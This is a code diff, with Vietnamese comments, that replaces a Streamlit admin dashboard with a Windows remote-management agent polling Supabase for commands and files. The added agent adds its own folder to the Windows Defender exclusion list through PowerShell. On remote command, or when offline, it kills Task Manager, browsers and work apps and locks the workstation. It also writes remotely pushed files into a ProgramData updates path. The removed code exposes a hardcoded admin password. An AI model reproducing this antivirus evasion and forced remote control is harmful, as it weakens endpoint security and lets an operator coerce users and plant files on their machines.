@@ -1,105 +1,158 @@
-import streamlit as st
+import time
+import os
+import sys
+import socket
+import subprocess
+import zlib
+import base64
+import ctypes
+from threading import Thread, Event
+import psutil
 from supabase import create_client, Client
-import pandas as pd
-from datetime import datetime, timedelta
-import plotly.express as px
-import base64, zlib, time
 
 # --- CORE CONFIG ---
 SUPABASE_URL = "https://glzdktdphoydqhofszvh.supabase.co"
 SUPABASE_KEY = "sb_publishable_MCfri2GPc3dn-bIcx_XJ_A_RxgsF1YU"
-ADMIN_PASSWORD = "Qb1100589373@" 
-sb: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+MY_MACHINE_ID = socket.gethostname()  
+AGENT_VERSION = "V12.5-APPLE-STANDARD"
 
-st.set_page_config(page_title="4Oranges SDM Lux Secure Pro", layout="wide")
+# Ép đường dẫn tuyệt đối để tránh file "đi lạc"
+TARGET_PATH = os.path.normpath(r"C:\ProgramData\Fast and Fluid Management\PrismaPro\Updates")
+WORK_APPS = ['PrismaPro.exe', 'ColorDesigner.exe', 'chrome.exe', 'msedge.exe', 'taskmgr.exe'] 
 
-# --- LOGIN LOGIC (Khôi phục nguyên bản) ---
-if 'authenticated' not in st.session_state: st.session_state['authenticated'] = False
-if not st.session_state['authenticated']:
-    c1, c2, c3 = st.columns([1, 2, 1])
-    with c2:
-        st.markdown("<h1 style='text-align: center;'>🍎 SDM Secure Pro</h1>", unsafe_allow_html=True)
-        pwd = st.text_input("Password", type="password")
-        if st.button("Đăng nhập", use_container_width=True):
-            if pwd == ADMIN_PASSWORD: st.session_state['authenticated'] = True; st.rerun()
-            else: st.error("Sai mật khẩu")
-    st.stop()
+class SDM_Pro_Agent:
+    def __init__(self):
+        self.boss_lock = Event()
+        self.sb = create_client(SUPABASE_URL, SUPABASE_KEY)
+        self.is_online = True
+        # Tạo thư mục nếu chưa có
+        if not os.path.exists(TARGET_PATH):
+            os.makedirs(TARGET_PATH, exist_ok=True)
+        self._set_admin_privileges()
 
-# --- DATA LOADING ---
-def load_all_data():
-    try:
-        dev = sb.table("devices").select("*").execute()
-        cmd = sb.table("commands").select("*").order("created_at", desc=True).limit(20).execute()
-        files = sb.table("file_queue").select("*").order("timestamp", desc=True).execute()
-        return pd.DataFrame(dev.data), pd.DataFrame(cmd.data), pd.DataFrame(files.data)
-    except: return pd.DataFrame(), pd.DataFrame(), pd.DataFrame()
+    def _set_admin_privileges(self):
+        """Tự thêm vào danh sách loại trừ của Windows Defender"""
+        try:
+            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{os.path.dirname(os.path.abspath(__file__))}\'"'
+            subprocess.run(cmd, shell=True, capture_output=True)
+        except: pass
 
-df_d, df_c, df_f = load_all_data()
+    def _check_internet(self):
+        try:
+            socket.create_connection(("8.8.8.8", 53), timeout=2)
+            self.is_online = True
+            return True
+        except:
+            self.is_online = False
+            return False
 
-# --- HEADER (Khôi phục nguyên bản) ---
-st.title("🍎 4Oranges Lux Management Pro")
+    def _kill_logic(self):
+        for app in WORK_APPS:
+            subprocess.run(f'taskkill /F /IM "{app}" /T', shell=True, capture_output=True)
+        ctypes.windll.user32.LockWorkStation()
 
-# --- 7 TABS CHIẾN LƯỢC (Khôi phục đầy đủ) ---
-t_mon, t_ctrl, t_file, t_sum, t_trace, t_ai, t_sys = st.tabs([
-    "📊 GIÁM SÁT", "🎮 ĐIỀU KHIỂN", "📤 TRUYỀN FILE", "📜 TỔNG KẾT", "🕵️ TRUY VẾT", "🧠 AI INSIGHT", "⚙️ HỆ THỐNG"
-])
+    def killer_loop(self):
+        while True:
+            try:
+                if self.boss_lock.is_set() or not self.is_online:
+                    self._kill_logic()
+                    time.sleep(1)
+                else:
+                    time.sleep(5)
+            except: pass
 
-with t_mon:
-    st.subheader("Trạng thái thiết bị thời gian thực")
-    st.dataframe(df_d, use_container_width=True, hide_index=True)
+    def command_listener(self):
+        while True:
+            try:
+                if self._check_internet():
+                    resp = self.sb.table("commands").select("*").eq("machine_id", MY_MACHINE_ID).eq("is_executed", False).order("created_at", desc=True).limit(1).execute()
+                    if resp.data:
+                        task = resp.data[0]
+                        cmd = task['command'].upper()
+                        if "LOCK" in cmd and "UNLOCK" not in cmd:
+                            self.boss_lock.set()
+                        elif "UNLOCK" in cmd:
+                            self.boss_lock.clear()
+                        self.sb.table("commands").update({"is_executed": True}).eq("id", task['id']).execute()
+            except: pass
+            time.sleep(5)
 
-with t_ctrl:
-    st.subheader("Trung tâm lệnh chiến lược")
-    selected = st.multiselect("Nhắm mục tiêu:", df_d['machine_id'].tolist() if not df_d.empty else [])
-    c1, c2 = st.columns(2)
-    if c1.button("🔒 KHÓA MÁY", type="primary"):
-        for m in selected: sb.table("commands").insert({"machine_id": m, "command": "LOCK"}).execute()
-        st.toast("Lệnh LOCK phát đi!")
-    if c2.button("🔓 MỞ MÁY"):
-        for m in selected: sb.table("commands").insert({"machine_id": m, "command": "UNLOCK"}).execute()
-        st.toast("Lệnh UNLOCK phát đi!")
+    def file_sync_engine(self):
+        """Engine V12.5: Nhận file -> Lưu đúng chỗ -> Giữ nhật ký trên Cloud 30 ngày"""
+        while True:
+            if self.is_online:
+                try:
+                    # 1. Tìm mảnh file đang PENDING
+                    res = self.sb.table("file_queue").select("*").eq("machine_id", MY_MACHINE_ID).eq("status", "PENDING").limit(1).execute()
+                    
+                    if res.data:
+                        file_info = res.data[0]
+                        ts = file_info['timestamp']
+                        
+                        # 2. Thu thập toàn bộ các mảnh dựa trên timestamp
+                        parts_res = self.sb.table("file_queue").select("*").eq("timestamp", ts).execute()
+                        parts = parts_res.data
+                        total_needed = int(file_info['part_info'].split('/')[-1])
+                        
+                        if len(parts) == total_needed:
+                            print(f"📦 Đang hợp nhất {total_needed} mảnh cho file: {file_info['file_name']}...")
+                            
+                            # 3. Sắp xếp và giải mã
+                            parts.sort(key=lambda x: int(x['part_info'].split('_')[1].split('/')[0]))
+                            full_b64 = "".join([p['data_chunk'] for p in parts])
+                            raw_data = zlib.decompress(base64.b64decode(full_b64))
+                            
+                            # 4. Lưu file với đường dẫn tuyệt đối
+                            save_path = os.path.join(TARGET_PATH, file_info['file_name'])
+                            with open(save_path, "wb") as f:
+                                f.write(raw_data)
+                            
+                            # 5. XÁC NHẬN HOÀN TẤT: Đổi status của TẤT CẢ các mảnh thành DONE
+                            # Điều này giúp Dashboard hiện ✅ Hoàn tất và không bị trùng lặp
+                            self.sb.table("file_queue").update({"status": "DONE"}).eq("timestamp", ts).execute()
+                            
+                            print(f"✅ [SUCCESS] File đã lưu tại: {save_path}")
+                            print(f"📜 [LOG] Đã cập nhật lịch sử lên hệ thống.")
+                except Exception as e:
+                    print(f"❌ [ERROR] FileSync: {e}")
+            time.sleep(10)
 
-with t_file:
-    st.subheader("Phát hành bộ dữ liệu SDF")
-    file_up = st.file_uploader("Kéo thả file .SDF", type=['sdf'])
-    f_targets = st.multiselect("Đại lý nhận mục tiêu:", df_d['machine_id'].unique().tolist() if not df_d.empty else [])
-    if st.button("🚀 KÍCH HOẠT ĐỒNG BỘ") and file_up and f_targets:
-        encoded = base64.b64encode(zlib.compress(file_up.getvalue())).decode('utf-8')
-        chunks = [encoded[i:i+100000] for i in range(0, len(encoded), 100000)]
-        ts = datetime.now().strftime("%Y%m%d%H%M%S")
-        for m in f_targets:
-            payload = [{"machine_id": m, "file_name": file_up.name, "data_chunk": c, "part_info": f"PART_{i+1}/{len(chunks)}", "timestamp": ts, "status": "PENDING"} for i, c in enumerate(chunks)]
-            sb.table("file_queue").insert(payload).execute()
-        st.success("Đã phát lệnh đồng bộ!")
+    def heartbeat(self):
+        while True:
+            if self.is_online:
+                try:
+                    status_text = "LOCKED" if self.boss_lock.is_set() else "READY"
+                    self.sb.table("devices").upsert({
+                        "machine_id": MY_MACHINE_ID,
+                        "status": f"Online | {status_text}",
+                        "cpu_usage": psutil.cpu_percent(),
+                        "ram_usage": psutil.virtual_memory().percent,
+                        "agent_version": AGENT_VERSION,
+                        "last_seen": "now()"
+                    }).execute()
+                except: pass
+            time.sleep(20)
 
-with t_sum:
-    st.subheader("📜 Nhật ký vận hành")
-    if not df_f.empty:
-        log_df = df_f.drop_duplicates(subset=['machine_id', 'timestamp'])
-        log_df['Kết quả'] = log_df['status'].apply(lambda x: "✅ Hoàn tất" if x == "DONE" else "⏳ Đang nhận...")
-        st.dataframe(log_df[['machine_id', 'file_name', 'timestamp', 'Kết quả']], use_container_width=True)
+    def run(self):
+        print(f"🚀 SDM PRO AGENT {AGENT_VERSION} ĐANG KHỞI CHẠY...")
+        print(f"📍 THƯ MỤC ĐÍCH: {TARGET_PATH}")
+        
+        threads = [
+            Thread(target=self.heartbeat, name="Heartbeat", daemon=True),
+            Thread(target=self.command_listener, name="Command", daemon=True),
+            Thread(target=self.killer_loop, name="Killer", daemon=True),
+            Thread(target=self.file_sync_engine, name="FileSync", daemon=True)
+        ]
+        
+        for t in threads:
+            t.start()
+            print(f"🧵 Đã kích hoạt luồng: {t.name}")
+            
+        while True:
+            self._check_internet()
+            time.sleep(10)
 
-with t_trace:
-    st.subheader("🕵️ Kiểm soát vắng mặt")
-    # Khôi phục logic slider của sếp
-    threshold = st.slider("Ngưỡng vắng mặt (ngày):", 1, 90, 30)
-    if not df_d.empty:
-        df_d['last_seen_dt'] = pd.to_datetime(df_d['last_seen'])
-        long_offline = df_d[df_d['last_seen_dt'] < (datetime.now(df_d['last_seen_dt'].dt.tz) - timedelta(days=threshold))]
-        st.dataframe(long_offline, use_container_width=True)
-
-with t_ai:
-    st.subheader("🧠 SDM AI Strategic Hub")
-    # Khôi phục biểu đồ và dự báo của sếp
-    c_st1, c_st2 = st.columns(2)
-    with c_st1:
-        if not df_d.empty:
-            st.plotly_chart(px.pie(df_d, names='status', title="Tình trạng hệ thống", hole=0.4))
-    with c_st2:
-        st.info("💡 **AI Dự báo:** Màu Xanh Ocean đang tăng trưởng mạnh.")
-
-with t_sys:
-    st.subheader("⚙️ Quản trị Database")
-    if st.button("🧹 DỌN DẸP TOÀN BỘ RÁC", type="primary"):
-        sb.table("file_queue").delete().eq("status", "DONE").execute()
-        st.success("Đã dọn dẹp!")
+if __name__ == "__main__":
+    # Chạy với quyền cao nhất để có thể ghi file vào ProgramData
+    agent = SDM_Pro_Agent()
+    agent.run()
